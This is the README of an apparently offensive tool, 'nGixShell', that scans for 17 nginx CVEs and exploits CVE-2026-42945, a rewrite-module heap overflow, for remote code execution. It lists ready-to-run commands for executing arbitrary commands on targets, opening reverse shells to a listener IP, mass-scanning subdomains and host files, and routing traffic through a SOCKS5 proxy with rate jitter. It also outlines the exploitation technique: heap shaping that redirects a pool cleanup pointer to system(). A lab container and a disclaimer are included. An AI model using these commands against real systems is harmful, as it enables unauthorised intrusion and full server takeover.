<div align="center">
  <img src="banner.svg" alt="nGixShell" width="100%"/>
</div>

---

nginx CVE scanner + RCE exploit framework.

Proof of concept for **CVE-2026-42945** — a critical heap buffer overflow in NGINX's `ngx_http_rewrite_module` — plus a scanner covering **17 known nginx CVEs** with automated HTTP probes, fingerprinting, web security auditing, and report generation.

> Original vulnerability discovered by [depthfirst](https://depthfirst.com)'s security analysis system.

---

## Quick Start

```bash
# Auto mode — fingerprint + full CVE scan + web audit + HTML report
python3 ngixshell.py 127.0.0.1:19321

# Run command via CVE-2026-42945
python3 ngixshell.py 127.0.0.1:19321 --cmd 'id'

# Reverse shell
python3 ngixshell.py 127.0.0.1:19321 --shell --listen-ip 10.0.0.1 --listen-port 4444

# Scan subdomains
python3 ngixshell.py --subdomain-scan example.com --scan-port 443

# Scan multiple targets from file
python3 ngixshell.py --target-file hosts.txt
```

No flags required — pointing the tool at a target is enough.  
TLS is **auto-detected**. An HTML report is **auto-generated** whenever findings exist.

---

## Usage

```
ngixshell.py [TARGET] [OPTIONS]

TARGET formats accepted:
  127.0.0.1
  192.168.1.10:8080
  http://192.168.1.10:8080
  https://target.local
```

### Modes

| Flag | Description |
|---|---|
| *(none)* | **Auto** — fingerprint + full CVE scan + web audit + report |
| `--cmd 'CMD'` | Execute command via CVE-2026-42945 RCE |
| `--cmd-file FILE` | Execute commands from file (joined with `;`) |
| `--shell` | Pop a reverse shell via CVE-2026-42945 |
| `--subdomain-scan DOMAIN` | Find vulnerable nginx on subdomains |
| `--cve CVE-ID` | Test one specific CVE |
| `--list-cves` | Print all 17 CVEs with CVSS and probe info |
| `--list-candidates` | Print heap address candidates |
| `--dry-run` | Fingerprint + scan without triggering exploit |
| `--target-file FILE` | Scan multiple hosts from a file |

### Web Audit (auto-enabled in scan mode)

| Flag | Description |
|---|---|
| *(none)* | All modules run automatically |
| `--skip-headers` | Skip HTTP security header audit |
| `--skip-paths` | Skip interesting path discovery |
| `--skip-vhosts` | Skip virtual host enumeration |
| `--skip-tls` | Skip TLS protocol / certificate audit |
| `--path-wordlist FILE` | Extra paths to probe (one per line) |

Web audit modules run automatically in auto mode. Each can be disabled individually.

#### Header Security Audit
Checks for missing or misconfigured HTTP security headers:
- `Strict-Transport-Security` (HSTS)
- `Content-Security-Policy` (CSP)
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Referrer-Policy`
- `Permissions-Policy`

Also flags information-leaking headers: `X-Powered-By`, `X-AspNet-Version`, `X-Generator`, etc.

#### Path Discovery
Probes 50+ interesting paths including:
- `/nginx_status` — nginx stub_status module (active connection metrics)
- `/.env`, `/.git/config` — sensitive file exposure
- `/admin`, `/swagger`, `/graphql` — admin panels and APIs
- `/metrics`, `/actuator`, `/health` — monitoring endpoints
- `/phpinfo.php`, `/server-status` — server information disclosure

#### Virtual Host Enumeration
Sends requests with common `Host:` header values (`admin`, `internal`, `dev`, `staging`, etc.) and flags responses that differ from the baseline, revealing hidden vhosts on shared-IP deployments.

#### TLS Audit
Tests protocol version support (TLS 1.0–1.3) and validates the server certificate (expiry, hostname match).

#### nginx stub_status
Parses active connection counts and request metrics from `/nginx_status` when the stub_status module is exposed.

### Connection

| Flag | Description |
|---|---|
| `--port PORT` | Override port |
| `--tls` | Force TLS (auto-detected by default) |
| `--proxy URL` | Proxy: `http://`, `https://`, `socks5://` |

### HTTP Customisation

| Flag | Description |
|---|---|
| `--user-agent UA` | Custom User-Agent header |
| `--auth USER:PASS` | HTTP Basic authentication |
| `--cookie VALUE` | Cookie header |
| `--header NAME:VALUE` | Extra header (repeatable) |

### Rate / Timing

| Flag | Description |
|---|---|
| `--rate-limit RPS` | Max requests per second |
| `--jitter MS` | Add random delay 0–MS ms between requests |
| `--retry N` | Retry probes on inconclusive result (default: 1) |
| `--timeout-multiplier X` | Scale all sleep timings (default: 1.0) |

### Output

| Flag | Description |
|---|---|
| `--output FILE` | Write log to FILE in addition to stdout |
| `--json` | Print JSON summary at end of run |
| `--html-report FILE` | Save HTML report to FILE |
| `--no-report` | Skip the automatic HTML report |
| `--verbose` | Debug output including caught exceptions |

---

## CVE Coverage

| CVE | CVSS | Description | Probe |
|---|---|---|---|
| CVE-2026-42945 | 9.8 CRITICAL | Heap overflow in rewrite module (RCE) | exploit |
| CVE-2026-42946 | 8.1 HIGH | Memory corruption in rewrite engine | version |
| CVE-2022-41741 | 7.8 HIGH | Memory corruption in mp4 module | version |
| CVE-2021-23017 | 7.7 HIGH | Off-by-one in DNS resolver | version |
| CVE-2016-1247 | 7.8 HIGH | Log file symlink privesc (local) | version |
| CVE-2017-7529 | 7.5 HIGH | Range filter integer overflow | HTTP probe |
| CVE-2026-40701 | 7.5 HIGH | Memory corruption in request processing | version |
| CVE-2026-42934 | 7.5 HIGH | Memory corruption (same advisory) | version |
| CVE-2022-41742 | 7.5 HIGH | Memory disclosure in mp4 module | version |
| CVE-2013-4547 | 7.5 HIGH | URI space+NUL bypass | HTTP probe |
| CVE-2013-2028 | 7.5 HIGH | Chunked encoding stack overflow | HTTP probe |
| CVE-2009-2629 | 7.5 HIGH | Buffer underflow in URI parsing | version |
| CVE-2012-2089 | 6.8 MEDIUM | Buffer overflow in mp4 module | version |
| CVE-2019-20372 | 5.3 MEDIUM | HTTP request smuggling | HTTP probe |
| CVE-2011-4963 | 5.0 MEDIUM | IPv6 literal access bypass | HTTP probe |
| CVE-2009-3896 | 5.0 MEDIUM | NULL pointer dereference DoS | version |
| CVE-2014-3616 | 4.3 MEDIUM | TLS SNI virtual host confusion | version |

---

## The Bug (CVE-2026-42945 TL;DR)

NGINX's script engine uses a two-pass process: first compute buffer size, then copy. The `is_args` flag is set on the main engine when a `rewrite` replacement contains `?`, but the length-calculation pass runs on a freshly zeroed sub-engine:

- **Length pass** sees `is_args = 0` → returns raw capture length
- **Copy pass** sees `is_args = 1` → calls `ngx_escape_uri` with `NGX_ESCAPE_ARGS`, expanding each escapable byte to 3 bytes

The copy overflows the undersized heap buffer with attacker-controlled URI data. Exploitation uses cross-request heap feng shui to corrupt an adjacent `ngx_pool_t`'s cleanup pointer, redirecting it to a fake `ngx_pool_cleanup_s` invoking `system()` on pool destruction.

---

## Affected Versions

| Product | Affected | Fixed in |
|---|---|---|
| NGINX Open Source | 0.6.27 – 1.30.0 | 1.31.0, 1.30.1 |
| NGINX Plus | R32 – R36 | R36 P4, R35 P2, R32 P6 |

Full vendor advisory: <https://my.f5.com/manage/s/article/K000160932>

---

## Setup

Tested on Ubuntu 24.04.3 LTS. No external dependencies — pure Python 3 stdlib.

```bash
# Build the vulnerable nginx container
docker compose -f env/docker-compose.yml up

# Scan all CVEs + run web audit
python3 ngixshell.py 127.0.0.1:19321

# Execute a command
python3 ngixshell.py 127.0.0.1:19321 --cmd 'id' --json

# Pop a shell
python3 ngixshell.py 127.0.0.1:19321 --shell --listen-ip 172.17.0.1 --listen-port 1337

# Scan subdomains
python3 ngixshell.py --subdomain-scan example.com --scan-port 443 --scan-tls

# Multiple targets with rate limiting
python3 ngixshell.py --target-file hosts.txt --rate-limit 5 --json

# Through SOCKS5 proxy
python3 ngixshell.py 192.168.1.10 --proxy socks5://127.0.0.1:9050

# Skip web audit modules individually
python3 ngixshell.py 127.0.0.1:19321 --skip-vhosts --skip-tls

# Custom path wordlist
python3 ngixshell.py 127.0.0.1:19321 --path-wordlist my_paths.txt
```

---

## Disclaimer

For authorized security testing, CTF competitions, and research only.
